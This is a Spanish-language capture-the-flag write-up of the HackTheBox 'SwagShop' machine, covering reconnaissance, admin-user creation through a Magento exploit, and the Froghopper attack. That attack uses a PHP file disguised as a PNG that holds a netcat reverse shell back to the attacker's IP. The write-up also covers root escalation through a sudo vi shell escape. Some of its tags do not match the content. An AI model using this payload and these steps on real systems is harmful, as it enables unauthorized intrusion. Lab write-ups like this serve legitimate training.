---
title: SwagShop | Linux
published: 2025-08-10
image: "./logo.png"
tags: [Easy, Linux, Information Leakage, PFsense, Abusing RRD Graphs, RCE, Evasion Techniques, eWPT, eWPTXv2, OSWE]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Magento CMS Exploitation (Creating an admin user)
- Magento - Froghopper Attack (RCE)
- Abusing sudoers (Privilege Escalation)

### Preparación

- eWPT
- OSWE
- OSCP

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.140 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.10.10.140`      | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```
nmap -sVC -p22,80 10.10.10.140 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.10.10.140`      | Dirección IP objetivo.                                                               |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://swagshop.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Whatweb

Usamos el comando **whatweb** para ver más información después de haber añadido a **/etc/hosts** el dominio **swagshop.htb** apuntando a **10.10.10.140**:

```
❯ whatweb http://10.10.10.140
http://10.10.10.140 [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.140], RedirectLocation[http://swagshop.htb/]
http://swagshop.htb/ [200 OK] Apache[2.4.29], Cookies[frontend], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[frontend], IP[10.10.10.140], JQuery[1.10.2], Magento, Modernizr, Prototype, Script[text/javascript], Scriptaculous, Title[Home page], X-Frame-Options[SAMEORIGIN]
```

### Magento

Vemos que en el puerto **80** hay una tienda:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fltth8YIDkbadOd0Z53ze%2Fimage.png?alt=media&#x26;token=97b7e366-5477-452b-858d-3294a1da3558" alt=""><figcaption></figcaption></figure>

Vamos a hacer fuzzing a ver si descubrimos algo más:

```
wfuzz -L -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.140/FUZZ
```

| Parámetro / elemento                                                                   | Descripción                                                                              |
| -------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| `-L`                                                                                   | Sigue las redirecciones de los códigos de estado **301**                                 |
| `-c`                                                                                   | Muestra la salida en **colores** para facilitar la lectura.                              |
| `--hc=404`                                                                             | **Oculta** (Hide Code) todas las respuestas con código HTTP `404 Not Found`.             |
| `-t 200`                                                                               | Usa **200 hilos** (threads) en paralelo para acelerar el fuzzing.                        |
| `-w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` | **Wordlist** que contiene los nombres de directorios/archivos que se probarán.           |
| `https://10.10.10.140/FUZZ`                                                            | **Objetivo** y **token `FUZZ`**: `FUZZ` será sustituido por cada entrada de la wordlist. |

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.140/FUZZ
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000080:   200        21 L     115 W      1917 Ch     "media"                                                                                                               
000000638:   200        16 L     59 W       946 Ch      "includes"                                                                                                            
000000721:   200        26 L     170 W      2877 Ch     "lib"                                                                                                                 
000000909:   200        20 L     104 W      1698 Ch     "app"                                                                                                                 
000001688:   200        19 L     89 W       1547 Ch     "shell"                                                                                                               
000001846:   200        18 L     82 W       1331 Ch     "skin"     
```

Hay cosas interesantes, pero vamos a probar incluyendo el **index.php:**

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.140/index.php/FUZZ
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000259:   200        51 L     211 W      3640 Ch     "admin"  
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FDySHkTN8Kv9D4qV072xT%2Fimage.png?alt=media&#x26;token=773ac086-0a78-46b5-b775-c4bc432ae56f" alt=""><figcaption></figcaption></figure>

## Explotación

Probando las credenciales por defecto de Magento nos da un error, por lo que podemos probar a buscar un exploit:

```wrap=false
❯ searchsploit Magento
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                                         | php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                                              | php/webapps/38651.txt
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting                                                   | php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting                                             | php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                                                            | php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                                       | php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                                                         | php/webapps/37811.py
Magento eCommerce - Local File Disclosure                                                                                                            | php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                                                                                            | xml/webapps/37977.py
Magento eCommerce CE v2.3.5-p2 - Blind SQLi                                                                                                          | php/webapps/50896.txt
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                                               | php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                                          | php/webapps/35052.txt
Magento ver. 2.4.6 - XSLT Server Side Injection                                                                                                      | multiple/webapps/51847.txt
Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                                                                         | php/webapps/48135.php
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Este parece interesante:

```
Magento eCommerce - Remote Code Execution    | xml/webapps/37977.py
```

Siguiendo los pasos del script su funcionamiento es simple, crea un usuario con el nombre y credenciales que escogamos con privilegios de administrador, en mi caso creé **zelpro:zelpro** y me logueé:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FSgWoLlkIOjpgYFtcZSBm%2Fimage.png?alt=media&#x26;token=b1234c37-816e-4c9e-adbd-3ce3268f7a8b" alt=""><figcaption></figcaption></figure>

### FrogHopper Attack

Activaremos en el apartado **System/Developer/Template Settings/Symlinks**. Todo esto para realizar el ataque **FrogHopper**. Para llevarlo acabo seguiremos los siguientes pasos:

#### 1. Crear una imagen mailiciosa

```php title="pwn.php.png"
<?php
   system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.14.5 4444 >/tmp/f");
?>
```

#### 2.  Crear una categoría con esta imagen y copiar su ruta

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F5fX2TyChBgFS9Nr4rk73%2Fimage.png?alt=media&#x26;token=2b5c4174-d13f-474f-837e-19e818b7f87a" alt=""><figcaption></figcaption></figure>

#### 3. Crear Newsletter Template con el siguiente código

```
{{block type="core/template" template="../../../../../../media/catalog/category/pwn.php.png"}}
```

```
❯ nc -nlvp 4444
listening on [any] 4444 ...
 connect to [10.10.14.5] from (UNKNOWN) [10.10.10.140] 33870
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ cat user.txt
3bc1dde182422f05f...
```

Además haremos la reverse shell más interactiva con la siguiente secuencia:

```
script -qc /bin/bash /dev/null
ctrl + z
stty raw -echo; fg
export TERM=xterm
```

## Escalada de privilegios

Para empezar a reconocer por donde podemos escalar privilegios en esta máquina se me ocurre el siguiente comando:

```
sudo -l
```

| Parámetro | Descripción                                                                       |
| --------- | --------------------------------------------------------------------------------- |
| `-l`      | Nos permite ver que **comandos** puede ejecutar el usuario con permisos **root**. |

```
www-data@swagshop:/var/www/html$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

Podemos ver que podemos usar **vi** como **root** dentro de la ruta `/var/www/html/`. Podemos aprovecharnos de esto de la siguiente manera:

```
:set shell=/bin/bash
```

```
:shell
```

Esto es un exploit muy sencillo y muy útil:

```
root@swagshop:/var/www/html# whoami
root
root@swagshop:~# cat root.txt 
b174b0d0bc513f1...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/188)

---